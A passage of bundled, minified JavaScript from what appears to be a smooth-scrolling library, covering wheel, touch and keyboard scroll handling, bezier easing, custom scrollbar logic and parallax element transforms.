                          this.deltasTimestamp[2 * this.stability - 2] +
                            this.delay >
                            Date.now() && e[0] === e[2 * this.stability - 1]
                        ) &&
                          ((n = e.slice(0, this.stability)),
                          (i = e.slice(this.stability, 2 * this.stability)),
                          (a = n.reduce(function (t, e) {
                            return t + e;
                          })),
                          (s = i.reduce(function (t, e) {
                            return t + e;
                          })),
                          (o = a / n.length),
                          (r = s / i.length),
                          Math.abs(o) < Math.abs(r * this.tolerance) &&
                            this.sensitivity < Math.abs(r) &&
                            t);
                  }),
                  (t.prototype.showLastUpDeltas = function () {
                    return this.lastUpDeltas;
                  }),
                  (t.prototype.showLastDownDeltas = function () {
                    return this.lastDownDeltas;
                  }),
                  t
                );
              })();
            }.call(M));
          }),
          X = {
            hasWheelEvent: "onwheel" in document,
            hasMouseWheelEvent: "onmousewheel" in document,
            hasTouch:
              "ontouchstart" in window ||
              window.TouchEvent ||
              (window.DocumentTouch && document instanceof DocumentTouch),
            hasTouchWin:
              navigator.msMaxTouchPoints && navigator.msMaxTouchPoints > 1,
            hasPointer: !!window.navigator.msPointerEnabled,
            hasKeyDown: "onkeydown" in document,
            isFirefox: navigator.userAgent.indexOf("Firefox") > -1,
          },
          U = Object.prototype.toString,
          q = Object.prototype.hasOwnProperty,
          V = function (t) {
            if (!t)
              return console.warn("bindAll requires at least one argument.");
            var e = Array.prototype.slice.call(arguments, 1);
            if (0 === e.length)
              for (var i in t)
                q.call(t, i) &&
                  "function" == typeof t[i] &&
                  "[object Function]" == U.call(t[i]) &&
                  e.push(i);
            for (var n = 0; n < e.length; n++) {
              var r = e[n];
              t[r] = G(t[r], t);
            }
          };
        function G(t, e) {
          return function () {
            return t.apply(e, arguments);
          };
        }
        var K = H.Lethargy,
          Q = "virtualscroll",
          Z = J,
          $ = { LEFT: 37, UP: 38, RIGHT: 39, DOWN: 40, SPACE: 32 };
        function J(t) {
          V(
            this,
            "_onWheel",
            "_onMouseWheel",
            "_onTouchStart",
            "_onTouchMove",
            "_onKeyDown"
          ),
            (this.el = window),
            t && t.el && ((this.el = t.el), delete t.el),
            (this.options = W(
              {
                mouseMultiplier: 1,
                touchMultiplier: 2,
                firefoxMultiplier: 15,
                keyStep: 120,
                preventTouch: !1,
                unpreventTouchClass: "vs-touchmove-allowed",
                limitInertia: !1,
                useKeyboard: !0,
                useTouch: !0,
              },
              t
            )),
            this.options.limitInertia && (this._lethargy = new K()),
            (this._emitter = new N()),
            (this._event = { y: 0, x: 0, deltaX: 0, deltaY: 0 }),
            (this.touchStartX = null),
            (this.touchStartY = null),
            (this.bodyTouchAction = null),
            void 0 !== this.options.passive &&
              (this.listenerOptions = { passive: this.options.passive });
        }
        function tt(t, e, i) {
          return (1 - i) * t + i * e;
        }
        function et(t) {
          var e = {};
          if (window.getComputedStyle) {
            var i = getComputedStyle(t),
              n = i.transform || i.webkitTransform || i.mozTransform,
              r = n.match(/^matrix3d\((.+)\)$/);
            return (
              r
                ? ((e.x = r ? parseFloat(r[1].split(", ")[12]) : 0),
                  (e.y = r ? parseFloat(r[1].split(", ")[13]) : 0))
                : ((r = n.match(/^matrix\((.+)\)$/)),
                  (e.x = r ? parseFloat(r[1].split(", ")[4]) : 0),
                  (e.y = r ? parseFloat(r[1].split(", ")[5]) : 0)),
              e
            );
          }
        }
        function it(t) {
          for (var e = []; t && t !== document; t = t.parentNode) e.push(t);
          return e;
        }
        (J.prototype._notify = function (t) {
          var e = this._event;
          (e.x += e.deltaX),
            (e.y += e.deltaY),
            this._emitter.emit(Q, {
              x: e.x,
              y: e.y,
              deltaX: e.deltaX,
              deltaY: e.deltaY,
              originalEvent: t,
            });
        }),
          (J.prototype._onWheel = function (t) {
            var e = this.options;
            if (!this._lethargy || !1 !== this._lethargy.check(t)) {
              var i = this._event;
              (i.deltaX = t.wheelDeltaX || -1 * t.deltaX),
                (i.deltaY = t.wheelDeltaY || -1 * t.deltaY),
                X.isFirefox &&
                  1 == t.deltaMode &&
                  ((i.deltaX *= e.firefoxMultiplier),
                  (i.deltaY *= e.firefoxMultiplier)),
                (i.deltaX *= e.mouseMultiplier),
                (i.deltaY *= e.mouseMultiplier),
                this._notify(t);
            }
          }),
          (J.prototype._onMouseWheel = function (t) {
            if (!this.options.limitInertia || !1 !== this._lethargy.check(t)) {
              var e = this._event;
              (e.deltaX = t.wheelDeltaX ? t.wheelDeltaX : 0),
                (e.deltaY = t.wheelDeltaY ? t.wheelDeltaY : t.wheelDelta),
                this._notify(t);
            }
          }),
          (J.prototype._onTouchStart = function (t) {
            var e = t.targetTouches ? t.targetTouches[0] : t;
            (this.touchStartX = e.pageX), (this.touchStartY = e.pageY);
          }),
          (J.prototype._onTouchMove = function (t) {
            var e = this.options;
            e.preventTouch &&
              !t.target.classList.contains(e.unpreventTouchClass) &&
              t.preventDefault();
            var i = this._event,
              n = t.targetTouches ? t.targetTouches[0] : t;
            (i.deltaX = (n.pageX - this.touchStartX) * e.touchMultiplier),
              (i.deltaY = (n.pageY - this.touchStartY) * e.touchMultiplier),
              (this.touchStartX = n.pageX),
              (this.touchStartY = n.pageY),
              this._notify(t);
          }),
          (J.prototype._onKeyDown = function (t) {
            var e = this._event;
            e.deltaX = e.deltaY = 0;
            var i = window.innerHeight - 40;
            switch (t.keyCode) {
              case $.LEFT:
              case $.UP:
                e.deltaY = this.options.keyStep;
                break;
              case $.RIGHT:
              case $.DOWN:
                e.deltaY = -this.options.keyStep;
                break;
              case t.shiftKey:
                e.deltaY = i;
                break;
              case $.SPACE:
                e.deltaY = -i;
                break;
              default:
                return;
            }
            this._notify(t);
          }),
          (J.prototype._bind = function () {
            X.hasWheelEvent &&
              this.el.addEventListener(
                "wheel",
                this._onWheel,
                this.listenerOptions
              ),
              X.hasMouseWheelEvent &&
                this.el.addEventListener(
                  "mousewheel",
                  this._onMouseWheel,
                  this.listenerOptions
                ),
              X.hasTouch &&
                this.options.useTouch &&
                (this.el.addEventListener(
                  "touchstart",
                  this._onTouchStart,
                  this.listenerOptions
                ),
                this.el.addEventListener(
                  "touchmove",
                  this._onTouchMove,
                  this.listenerOptions
                )),
              X.hasPointer &&
                X.hasTouchWin &&
                ((this.bodyTouchAction = document.body.style.msTouchAction),
                (document.body.style.msTouchAction = "none"),
                this.el.addEventListener(
                  "MSPointerDown",
                  this._onTouchStart,
                  !0
                ),
                this.el.addEventListener(
                  "MSPointerMove",
                  this._onTouchMove,
                  !0
                )),
              X.hasKeyDown &&
                this.options.useKeyboard &&
                document.addEventListener("keydown", this._onKeyDown);
          }),
          (J.prototype._unbind = function () {
            X.hasWheelEvent &&
              this.el.removeEventListener("wheel", this._onWheel),
              X.hasMouseWheelEvent &&
                this.el.removeEventListener("mousewheel", this._onMouseWheel),
              X.hasTouch &&
                (this.el.removeEventListener("touchstart", this._onTouchStart),
                this.el.removeEventListener("touchmove", this._onTouchMove)),
              X.hasPointer &&
                X.hasTouchWin &&
                ((document.body.style.msTouchAction = this.bodyTouchAction),
                this.el.removeEventListener(
                  "MSPointerDown",
                  this._onTouchStart,
                  !0
                ),
                this.el.removeEventListener(
                  "MSPointerMove",
                  this._onTouchMove,
                  !0
                )),
              X.hasKeyDown &&
                this.options.useKeyboard &&
                document.removeEventListener("keydown", this._onKeyDown);
          }),
          (J.prototype.on = function (t, e) {
            this._emitter.on(Q, t, e);
            var i = this._emitter.e;
            i && i[Q] && 1 === i[Q].length && this._bind();
          }),
          (J.prototype.off = function (t, e) {
            this._emitter.off(Q, t, e);
            var i = this._emitter.e;
            (!i[Q] || i[Q].length <= 0) && this._unbind();
          }),
          (J.prototype.reset = function () {
            var t = this._event;
            (t.x = 0), (t.y = 0);
          }),
          (J.prototype.destroy = function () {
            this._emitter.off(), this._unbind();
          });
        var nt = 4,
          rt = 0.001,
          st = 1e-7,
          ot = 10,
          at = 11,
          lt = 1 / (at - 1),
          ct = "function" == typeof Float32Array;
        function ut(t, e) {
          return 1 - 3 * e + 3 * t;
        }
        function ht(t, e) {
          return 3 * e - 6 * t;
        }
        function ft(t) {
          return 3 * t;
        }
        function dt(t, e, i) {
          return ((ut(e, i) * t + ht(e, i)) * t + ft(e)) * t;
        }
        function pt(t, e, i) {
          return 3 * ut(e, i) * t * t + 2 * ht(e, i) * t + ft(e);
        }
        function mt(t, e, i, n, r) {
          var s,
            o,
            a = 0;
          do {
            (s = dt((o = e + (i - e) / 2), n, r) - t) > 0 ? (i = o) : (e = o);
          } while (Math.abs(s) > st && ++a < ot);
          return o;
        }
        function gt(t, e, i, n) {
          for (var r = 0; r < nt; ++r) {
            var s = pt(e, i, n);
            if (0 === s) return e;
            e -= (dt(e, i, n) - t) / s;
          }
          return e;
        }
        function vt(t) {
          return t;
        }
        var _t = function (t, e, i, n) {
            if (!(0 <= t && t <= 1 && 0 <= i && i <= 1))
              throw new Error("bezier x values must be in [0, 1] range");
            if (t === e && i === n) return vt;
            for (
              var r = ct ? new Float32Array(at) : new Array(at), s = 0;
              s < at;
              ++s
            )
              r[s] = dt(s * lt, t, i);
            return function (s) {
              return 0 === s
                ? 0
                : 1 === s
                ? 1
                : dt(
                    (function (e) {
                      for (
                        var n = 0, s = 1, o = at - 1;
                        s !== o && r[s] <= e;
                        ++s
                      )
                        n += lt;
                      var a = n + ((e - r[--s]) / (r[s + 1] - r[s])) * lt,
                        l = pt(a, t, i);
                      return l >= rt
                        ? gt(e, a, t, i)
                        : 0 === l
                        ? a
                        : mt(e, n, n + lt, t, i);
                    })(s),
                    e,
                    n
                  );
            };
          },
          yt = {
            LEFT: 37,
            UP: 38,
            RIGHT: 39,
            DOWN: 40,
            SPACE: 32,
            TAB: 9,
            PAGEUP: 33,
            PAGEDOWN: 34,
            HOME: 36,
            END: 35,
          },
          bt = (function (t) {
            u(i, t);
            var e = g(i);
            function i() {
              var t,
                n =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : {};
              return (
                r(this, i),
                history.scrollRestoration &&
                  (history.scrollRestoration = "manual"),
                window.scrollTo(0, 0),
                (t = e.call(this, n)).inertia && (t.lerp = 0.1 * t.inertia),
                (t.isScrolling = !1),
                (t.isDraggingScrollbar = !1),
                (t.isTicking = !1),
                (t.hasScrollTicking = !1),
                (t.parallaxElements = {}),
                (t.stop = !1),
                (t.scrollbarContainer = n.scrollbarContainer),
                (t.checkKey = t.checkKey.bind(p(t))),
                window.addEventListener("keydown", t.checkKey, !1),
                t
              );
            }
            return (
              o(i, [
                {
                  key: "init",
                  value: function () {
                    var t = this;
                    this.html.classList.add(this.smoothClass),
                      this.html.setAttribute(
                        "data-".concat(this.name, "-direction"),
                        this.direction
                      ),
                      (this.instance = c(
                        {
                          delta: {
                            x: this.initPosition.x,
                            y: this.initPosition.y,
                          },
                          scroll: {
                            x: this.initPosition.x,
                            y: this.initPosition.y,
                          },
                        },
                        this.instance
                      )),
                      (this.vs = new Z({
                        el: this.scrollFromAnywhere ? document : this.el,
                        mouseMultiplier:
                          navigator.platform.indexOf("Win") > -1 ? 1 : 0.4,
                        firefoxMultiplier: this.firefoxMultiplier,
                        touchMultiplier: this.touchMultiplier,
                        useKeyboard: !1,
                        passive: !0,
                      })),
                      this.vs.on(function (e) {
                        t.stop ||
                          t.isDraggingScrollbar ||
                          requestAnimationFrame(function () {
                            t.updateDelta(e),
                              t.isScrolling || t.startScrolling();
                          });
                      }),
                      this.setScrollLimit(),
                      this.initScrollBar(),
                      this.addSections(),
                      this.addElements(),
                      this.checkScroll(!0),
                      this.transformElements(!0, !0),
                      _(h(i.prototype), "init", this).call(this);
                  },
                },
                {
                  key: "setScrollLimit",
                  value: function () {
                    if (
                      ((this.instance.limit.y =
                        this.el.offsetHeight - this.windowHeight),
                      "horizontal" === this.direction)
                    ) {
                      for (
                        var t = 0, e = this.el.children, i = 0;
                        i < e.length;
                        i++
                      )
                        t += e[i].offsetWidth;
                      this.instance.limit.x = t - this.windowWidth;
                    }
                  },
                },
                {
                  key: "startScrolling",
                  value: function () {
                    (this.startScrollTs = Date.now()),
                      (this.isScrolling = !0),
                      this.checkScroll(),
                      this.html.classList.add(this.scrollingClass);
                  },
                },
                {
                  key: "stopScrolling",
                  value: function () {
                    cancelAnimationFrame(this.checkScrollRaf),
                      this.scrollToRaf &&
                        (cancelAnimationFrame(this.scrollToRaf),
                        (this.scrollToRaf = null)),
                      (this.isScrolling = !1),
                      (this.instance.scroll.y = Math.round(
                        this.instance.scroll.y
                      )),
                      this.html.classList.remove(this.scrollingClass);
                  },
                },
                {
                  key: "checkKey",
                  value: function (t) {
                    var e = this;
                    if (this.stop)
                      t.keyCode == yt.TAB &&
                        requestAnimationFrame(function () {
                          (e.html.scrollTop = 0),
                            (document.body.scrollTop = 0),
                            (e.html.scrollLeft = 0),
                            (document.body.scrollLeft = 0);
                        });
                    else {
                      switch (t.keyCode) {
                        case yt.TAB:
                          requestAnimationFrame(function () {
                            (e.html.scrollTop = 0),
                              (document.body.scrollTop = 0),
                              (e.html.scrollLeft = 0),
                              (document.body.scrollLeft = 0),
                              e.scrollTo(document.activeElement, {
                                offset: -window.innerHeight / 2,
                              });
                          });
                          break;
                        case yt.UP:
                          this.instance.delta[this.directionAxis] -= 240;
                          break;
                        case yt.DOWN:
                          this.instance.delta[this.directionAxis] += 240;
                          break;
                        case yt.PAGEUP:
                          this.instance.delta[this.directionAxis] -=
                            window.innerHeight;
                          break;
                        case yt.PAGEDOWN:
                          this.instance.delta[this.directionAxis] +=
                            window.innerHeight;
                          break;
                        case yt.HOME:
                          this.instance.delta[this.directionAxis] -=
                            this.instance.limit[this.directionAxis];
                          break;
                        case yt.END:
                          this.instance.delta[this.directionAxis] +=
                            this.instance.limit[this.directionAxis];
                          break;
                        case yt.SPACE:
                          document.activeElement instanceof HTMLInputElement ||
                            document.activeElement instanceof
                              HTMLTextAreaElement ||
                            (t.shiftKey
                              ? (this.instance.delta[this.directionAxis] -=
                                  window.innerHeight)
                              : (this.instance.delta[this.directionAxis] +=
                                  window.innerHeight));
                          break;
                        default:
                          return;
                      }
                      this.instance.delta[this.directionAxis] < 0 &&
                        (this.instance.delta[this.directionAxis] = 0),
                        this.instance.delta[this.directionAxis] >
                          this.instance.limit[this.directionAxis] &&
                          (this.instance.delta[this.directionAxis] =
                            this.instance.limit[this.directionAxis]),
                        this.stopScrolling(),
                        (this.isScrolling = !0),
                        this.checkScroll(),
                        this.html.classList.add(this.scrollingClass);
                    }
                  },
                },
                {
                  key: "checkScroll",
                  value: function () {
                    var t = this,
                      e =
                        arguments.length > 0 &&
                        void 0 !== arguments[0] &&
                        arguments[0];
                    if (e || this.isScrolling || this.isDraggingScrollbar) {
                      this.hasScrollTicking ||
                        ((this.checkScrollRaf = requestAnimationFrame(
                          function () {
                            return t.checkScroll();
                          }
                        )),
                        (this.hasScrollTicking = !0)),
                        this.updateScroll();
                      var n = Math.abs(
                          this.instance.delta[this.directionAxis] -
                            this.instance.scroll[this.directionAxis]
                        ),
                        r = Date.now() - this.startScrollTs;
                      if (
                        (!this.animatingScroll &&
                          r > 100 &&
                          ((n < 0.5 &&
                            0 != this.instance.delta[this.directionAxis]) ||
                            (n < 0.5 &&
                              0 == this.instance.delta[this.directionAxis])) &&
                          this.stopScrolling(),
                        Object.entries(this.sections).forEach(function (i) {
                          var n = y(i, 2),
                            r = (n[0], n[1]);
                          r.persistent ||
                          (t.instance.scroll[t.directionAxis] >
                            r.offset[t.directionAxis] &&
                            t.instance.scroll[t.directionAxis] <
                              r.limit[t.directionAxis])
                            ? ("horizontal" === t.direction
                                ? t.transform(
                                    r.el,
                                    -t.instance.scroll[t.directionAxis],
                                    0
                                  )
                                : t.transform(
                                    r.el,
                                    0,
                                    -t.instance.scroll[t.directionAxis]
                                  ),
                              r.inView ||
                                ((r.inView = !0),
                                (r.el.style.opacity = 1),
                                (r.el.style.pointerEvents = "all"),
                                r.el.setAttribute(
                                  "data-".concat(t.name, "-section-inview"),
                                  ""
                                )))
                            : ((r.inView || e) &&
                                ((r.inView = !1),
                                (r.el.style.opacity = 0),
                                (r.el.style.pointerEvents = "none"),
                                r.el.removeAttribute(
                                  "data-".concat(t.name, "-section-inview")
                                )),
                              t.transform(r.el, 0, 0));
                        }),
                        this.getDirection && this.addDirection(),
                        this.getSpeed &&
                          (this.addSpeed(), (this.speedTs = Date.now())),
                        this.detectElements(),
                        this.transformElements(),
                        this.hasScrollbar)
                      ) {
                        var s =
                          (this.instance.scroll[this.directionAxis] /
                            this.instance.limit[this.directionAxis]) *
                          this.scrollBarLimit[this.directionAxis];
                        "horizontal" === this.direction
                          ? this.transform(this.scrollbarThumb, s, 0)
                          : this.transform(this.scrollbarThumb, 0, s);
                      }
                      _(h(i.prototype), "checkScroll", this).call(this),
                        (this.hasScrollTicking = !1);
                    }
                  },
                },
                {
                  key: "resize",
                  value: function () {
                    (this.windowHeight = window.innerHeight),
                      (this.windowWidth = window.innerWidth),
                      this.checkContext(),
                      (this.windowMiddle = {
                        x: this.windowWidth / 2,
                        y: this.windowHeight / 2,
                      }),
                      this.update();
                  },
                },
                {
                  key: "updateDelta",
                  value: function (t) {
                    var e,
                      i =
                        this[this.context] &&
                        this[this.context].gestureDirection
                          ? this[this.context].gestureDirection
                          : this.gestureDirection;
                    (e =
                      "both" === i
                        ? t.deltaX + t.deltaY
                        : "vertical" === i
                        ? t.deltaY
                        : "horizontal" === i
                        ? t.deltaX
                        : t.deltaY),
                      (this.instance.delta[this.directionAxis] -=
                        e * this.multiplier),
                      this.instance.delta[this.directionAxis] < 0 &&
                        (this.instance.delta[this.directionAxis] = 0),
                      this.instance.delta[this.directionAxis] >
                        this.instance.limit[this.directionAxis] &&
                        (this.instance.delta[this.directionAxis] =
                          this.instance.limit[this.directionAxis]);
                  },
                },
                {
                  key: "updateScroll",
                  value: function (t) {
                    this.isScrolling || this.isDraggingScrollbar
                      ? (this.instance.scroll[this.directionAxis] = tt(
                          this.instance.scroll[this.directionAxis],
                          this.instance.delta[this.directionAxis],
                          this.lerp
                        ))
                      : this.instance.scroll[this.directionAxis] >
                        this.instance.limit[this.directionAxis]
                      ? this.setScroll(
                          this.instance.scroll[this.directionAxis],
                          this.instance.limit[this.directionAxis]
                        )
                      : this.instance.scroll.y < 0
                      ? this.setScroll(
                          this.instance.scroll[this.directionAxis],
                          0
                        )
                      : this.setScroll(
                          this.instance.scroll[this.directionAxis],
                          this.instance.delta[this.directionAxis]
                        );
                  },
                },
                {
                  key: "addDirection",
                  value: function () {
                    this.instance.delta.y > this.instance.scroll.y
                      ? "down" !== this.instance.direction &&
                        (this.instance.direction = "down")
                      : this.instance.delta.y < this.instance.scroll.y &&
                        "up" !== this.instance.direction &&
                        (this.instance.direction = "up"),
                      this.instance.delta.x > this.instance.scroll.x
                        ? "right" !== this.instance.direction &&
                          (this.instance.direction = "right")
                        : this.instance.delta.x < this.instance.scroll.x &&
                          "left" !== this.instance.direction &&
                          (this.instance.direction = "left");
                  },
                },
                {
                  key: "addSpeed",
                  value: function () {
                    this.instance.delta[this.directionAxis] !=
                    this.instance.scroll[this.directionAxis]
                      ? (this.instance.speed =
                          (this.instance.delta[this.directionAxis] -
                            this.instance.scroll[this.directionAxis]) /
                          Math.max(1, Date.now() - this.speedTs))
                      : (this.instance.speed = 0);
                  },
                },
                {
                  key: "initScrollBar",
                  value: function () {
                    if (
                      ((this.scrollbar = document.createElement("span")),
                      (this.scrollbarThumb = document.createElement("span")),
                      this.scrollbar.classList.add(
                        "".concat(this.scrollbarClass)
                      ),
                      this.scrollbarThumb.classList.add(
                        "".concat(this.scrollbarClass, "_thumb")
                      ),
                      this.scrollbar.append(this.scrollbarThumb),
                      this.scrollbarContainer
                        ? this.scrollbarContainer.append(this.scrollbar)
                        : document.body.append(this.scrollbar),
                      (this.getScrollBar = this.getScrollBar.bind(this)),
                      (this.releaseScrollBar =
                        this.releaseScrollBar.bind(this)),
                      (this.moveScrollBar = this.moveScrollBar.bind(this)),
                      this.scrollbarThumb.addEventListener(
                        "mousedown",
                        this.getScrollBar
                      ),
                      window.addEventListener("mouseup", this.releaseScrollBar),
                      window.addEventListener("mousemove", this.moveScrollBar),
                      (this.hasScrollbar = !1),
                      "horizontal" == this.direction)
                    ) {
                      if (
                        this.instance.limit.x + this.windowWidth <=
                        this.windowWidth
                      )
                        return;
                    } else if (
                      this.instance.limit.y + this.windowHeight <=
                      this.windowHeight
                    )
                      return;
                    (this.hasScrollbar = !0),
                      (this.scrollbarBCR =
                        this.scrollbar.getBoundingClientRect()),
                      (this.scrollbarHeight = this.scrollbarBCR.height),
                      (this.scrollbarWidth = this.scrollbarBCR.width),
                      "horizontal" === this.direction
                        ? (this.scrollbarThumb.style.width = "".concat(
                            (this.scrollbarWidth * this.scrollbarWidth) /
                              (this.instance.limit.x + this.scrollbarWidth),
                            "px"
                          ))
                        : (this.scrollbarThumb.style.height = "".concat(
                            (this.scrollbarHeight * this.scrollbarHeight) /
                              (this.instance.limit.y + this.scrollbarHeight),
                            "px"
                          )),
                      (this.scrollbarThumbBCR =
                        this.scrollbarThumb.getBoundingClientRect()),
                      (this.scrollBarLimit = {
                        x: this.scrollbarWidth - this.scrollbarThumbBCR.width,
                        y: this.scrollbarHeight - this.scrollbarThumbBCR.height,
                      });
                  },
                },
                {
                  key: "reinitScrollBar",
                  value: function () {
                    if (
                      ((this.hasScrollbar = !1), "horizontal" == this.direction)
                    ) {
                      if (
                        this.instance.limit.x + this.windowWidth <=
                        this.windowWidth
                      )
                        return;
                    } else if (
                      this.instance.limit.y + this.windowHeight <=
                      this.windowHeight
                    )
                      return;
                    (this.hasScrollbar = !0),
                      (this.scrollbarBCR =
                        this.scrollbar.getBoundingClientRect()),
                      (this.scrollbarHeight = this.scrollbarBCR.height),
                      (this.scrollbarWidth = this.scrollbarBCR.width),
                      "horizontal" === this.direction
                        ? (this.scrollbarThumb.style.width = "".concat(
                            (this.scrollbarWidth * this.scrollbarWidth) /
                              (this.instance.limit.x + this.scrollbarWidth),
                            "px"
                          ))
                        : (this.scrollbarThumb.style.height = "".concat(
                            (this.scrollbarHeight * this.scrollbarHeight) /
                              (this.instance.limit.y + this.scrollbarHeight),
                            "px"
                          )),
                      (this.scrollbarThumbBCR =
                        this.scrollbarThumb.getBoundingClientRect()),
                      (this.scrollBarLimit = {
                        x: this.scrollbarWidth - this.scrollbarThumbBCR.width,
                        y: this.scrollbarHeight - this.scrollbarThumbBCR.height,
                      });
                  },
                },
                {
                  key: "destroyScrollBar",
                  value: function () {
                    this.scrollbarThumb.removeEventListener(
                      "mousedown",
                      this.getScrollBar
                    ),
                      window.removeEventListener(
                        "mouseup",
                        this.releaseScrollBar
                      ),
                      window.removeEventListener(
                        "mousemove",
                        this.moveScrollBar
                      ),
                      this.scrollbar.remove();
                  },
                },
                {
                  key: "getScrollBar",
                  value: function (t) {
                    (this.isDraggingScrollbar = !0),
                      this.checkScroll(),
                      this.html.classList.remove(this.scrollingClass),
                      this.html.classList.add(this.draggingClass);
                  },
                },
                {
                  key: "releaseScrollBar",
                  value: function (t) {
                    (this.isDraggingScrollbar = !1),
                      this.html.classList.add(this.scrollingClass),
                      this.html.classList.remove(this.draggingClass);
                  },
                },
                {
                  key: "moveScrollBar",
                  value: function (t) {
                    var e = this;
                    this.isDraggingScrollbar &&
                      requestAnimationFrame(function () {
                        var i =
                            (((100 * (t.clientX - e.scrollbarBCR.left)) /
                              e.scrollbarWidth) *
                              e.instance.limit.x) /
                            100,
                          n =
                            (((100 * (t.clientY - e.scrollbarBCR.top)) /
                              e.scrollbarHeight) *
                              e.instance.limit.y) /
                            100;
                        n > 0 &&
                          n < e.instance.limit.y &&
                          (e.instance.delta.y = n),
                          i > 0 &&
                            i < e.instance.limit.x &&
                            (e.instance.delta.x = i);
                      });
                  },
                },
                {
                  key: "addElements",
                  value: function () {
                    var t = this;
                    (this.els = {}),
                      (this.parallaxElements = {}),
                      this.el
                        .querySelectorAll("[data-".concat(this.name, "]"))
                        .forEach(function (e, i) {
                          var n,
                            r,
                            s,
                            o = it(e),
                            a = Object.entries(t.sections)
                              .map(function (t) {
                                var e = y(t, 2);
                                return e[0], e[1];
                              })
                              .find(function (t) {
                                return o.includes(t.el);
                              }),
                            l = e.dataset[t.name + "Class"] || t.class,
                            c =
                              "string" == typeof e.dataset[t.name + "Id"]
                                ? e.dataset[t.name + "Id"]
                                : "el" + i,
                            u = e.dataset[t.name + "Repeat"],
                            h = e.dataset[t.name + "Call"],
                            f = e.dataset[t.name + "Position"],
                            d = e.dataset[t.name + "Delay"],
                            p = e.dataset[t.name + "Direction"],
                            m = "string" == typeof e.dataset[t.name + "Sticky"],
                            g =
                              !!e.dataset[t.name + "Speed"] &&
                              parseFloat(e.dataset[t.name + "Speed"]) / 10,
                            v =
                              "string" == typeof e.dataset[t.name + "Offset"]
                                ? e.dataset[t.name + "Offset"].split(",")
                                : t.offset,
                            _ = e.dataset[t.name + "Target"],
                            b = (s =
                              void 0 !== _
                                ? document.querySelector("".concat(_))
                                : e).getBoundingClientRect();
                          null === a || a.inView
                            ? ((n = b.top + t.instance.scroll.y - et(s).y),
                              (r = b.left + t.instance.scroll.x - et(s).x))
                            : ((n = b.top - et(a.el).y - et(s).y),
                              (r = b.left - et(a.el).x - et(s).x));
                          var w = n + s.offsetHeight,
                            x = r + s.offsetWidth,
                            T = { x: (x - r) / 2 + r, y: (w - n) / 2 + n };
                          if (m) {
                            var S = e.getBoundingClientRect(),
                              k = S.top,
                              O = S.left,
                              E = { x: O - r, y: k - n };
                            (n += window.innerHeight),
                              (r += window.innerWidth),
                              (w =
                                k +
                                s.offsetHeight -
                                e.offsetHeight -
                                E[t.directionAxis]),
                              (T = {
                                x:
                                  ((x =
                                    O +
                                    s.offsetWidth -
                                    e.offsetWidth -
                                    E[t.directionAxis]) -
                                    r) /
                                    2 +
                                  r,
                                y: (w - n) / 2 + n,
                              });
                          }
                          u = "false" != u && (null != u || t.repeat);
                          var A = [0, 0];
                          if (v)
                            if ("horizontal" === t.direction) {
                              for (var P = 0; P < v.length; P++)
                                "string" == typeof v[P]
                                  ? v[P].includes("%")
                                    ? (A[P] = parseInt(
                                        (v[P].replace("%", "") *
                                          t.windowWidth) /
                                          100
                                      ))
                                    : (A[P] = parseInt(v[P]))
                                  : (A[P] = v[P]);
                              (r += A[0]), (x -= A[1]);
                            } else {
                              for (P = 0; P < v.length; P++)
                                "string" == typeof v[P]
                                  ? v[P].includes("%")
                                    ? (A[P] = parseInt(
                                        (v[P].replace("%", "") *
                                          t.windowHeight) /
                                          100
                                      ))
                                    : (A[P] = parseInt(v[P]))
                                  : (A[P] = v[P]);
                              (n += A[0]), (w -= A[1]);
                            }
                          var C = {
                            el: e,
                            id: c,
                            class: l,
                            section: a,
                            top: n,
                            middle: T,
                            bottom: w,
                            left: r,
                            right: x,
                            offset: v,
                            progress: 0,
                            repeat: u,
                            inView: !1,
                            call: h,
                            speed: g,
                            delay: d,
                            position: f,
                            target: s,
                            direction: p,
                            sticky: m,
                          };
                          (t.els[c] = C),
                            e.classList.contains(l) && t.setInView(t.els[c], c),
                            (!1 !== g || m) && (t.parallaxElements[c] = C);
                        });
                  },
                },
                {
                  key: "addSections",
                  value: function () {
                    var t = this;
                    this.sections = {};
                    var e = this.el.querySelectorAll(
                      "[data-".concat(this.name, "-section]")
                    );
                    0 === e.length && (e = [this.el]),
                      e.forEach(function (e, i) {
                        var n =
                            "string" == typeof e.dataset[t.name + "Id"]
                              ? e.dataset[t.name + "Id"]
                              : "section" + i,
                          r = e.getBoundingClientRect(),
                          s = {
                            x: r.left - 1.5 * window.innerWidth - et(e).x,
                            y: r.top - 1.5 * window.innerHeight - et(e).y,
                          },
                          o = {
                            x: s.x + r.width + 2 * window.innerWidth,
                            y: s.y + r.height + 2 * window.innerHeight,
                          },
                          a =
                            "string" == typeof e.dataset[t.name + "Persistent"];
                        e.setAttribute("data-scroll-section-id", n);
                        var l = {
                          el: e,
                          offset: s,
                          limit: o,
                          inView: !1,
                          persistent: a,
                          id: n,
                        };
                        t.sections[n] = l;
                      });
                  },
                },
                {
                  key: "transform",
                  value: function (t, e, i, n) {
                    var r;
                    if (n) {
                      var s = et(t),
                        o = tt(s.x, e, n),
                        a = tt(s.y, i, n);
                      r = "matrix3d(1,0,0.00,0,0.00,1,0.00,0,0,0,1,0,"
                        .concat(o, ",")
                        .concat(a, ",0,1)");
                    } else
                      r = "matrix3d(1,0,0.00,0,0.00,1,0.00,0,0,0,1,0,"
                        .concat(e, ",")
                        .concat(i, ",0,1)");
                    (t.style.webkitTransform = r),
                      (t.style.msTransform = r),
                      (t.style.transform = r);
                  },
                },
                {
                  key: "transformElements",
                  value: function (t) {
                    var e = this,
                      i =
                        arguments.length > 1 &&
                        void 0 !== arguments[1] &&
                        arguments[1],
                      n = this.instance.scroll.x + this.windowWidth,
                      r = this.instance.scroll.y + this.windowHeight,
                      s = {
                        x: this.instance.scroll.x + this.windowMiddle.x,
                        y: this.instance.scroll.y + this.windowMiddle.y,
                      };
                    Object.entries(this.parallaxElements).forEach(function (o) {
                      var a = y(o, 2),
                        l = (a[0], a[1]),
                        c = !1;
                      if ((t && (c = 0), l.inView || i))
                        switch (l.position) {
                          case "top":
                            c = e.instance.scroll[e.directionAxis] * -l.speed;
                            break;
                          case "elementTop":
                            c = (r - l.top) * -l.speed;
                            break;
                          case "bottom":
                            c =
                              (e.instance.limit[e.directionAxis] -
                                r +
                                e.windowHeight) *
                              l.speed;
                            break;
                          case "left":
                            c = e.instance.scroll[e.directionAxis] * -l.speed;
                            break;
                          case "elementLeft":
                            c = (n - l.left) * -l.speed;
                            break;
                          case "right":
                            c =
                              (e.instance.limit[e.directionAxis] -
                                n +
                                e.windowHeight) *
                              l.speed;
